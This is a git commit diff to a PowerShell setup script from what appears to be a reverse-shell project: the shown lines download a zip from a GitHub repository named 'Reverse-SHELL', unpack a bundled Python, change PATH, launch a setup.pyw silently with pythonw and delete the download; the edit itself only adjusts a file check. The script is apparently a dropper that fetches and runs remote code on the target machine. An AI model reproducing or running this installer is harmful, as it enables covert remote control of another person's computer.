e2ac7e4c16eda21bc4ab0c2812a8c554d6f2872b
Muzaffar Sharofitdinov <smartboymuzaffar@gmail.com>
2024-04-29 15:44:06 +0900

    Update setup.ps1

--- setup.ps1
+++ setup.ps1
@@ -6,7 +6,7 @@ while (!(Test-Path "$env:PythonPath\setup.pyw")) {Start-Sleep -Seconds 1}
 Invoke-WebRequest -Uri "https://github.com/SmartBoyMuzaffar/Reverse-SHELL/raw/master/python-3.12.zip" -OutFile "$env:PythonPath\python-3.12.zip"
 while (!(Test-Path "$env:PythonPath\python-3.12.zip")) {Start-Sleep -Seconds 1}
 tar -xf "$env:PythonPath\python-3.12.zip" -C $env:PythonPath
-while (!(Test-Path "$env:PythonPath\python")) {Start-Sleep -Seconds 1}
+while (!(Test-Path "$env:PythonPath\python.exe")) {Start-Sleep -Seconds 1}
 SETX PATH $env:PythonPath
 pythonw $env:PythonPath\setup.pyw
 rm $env:PythonPath\python-3.12.zip
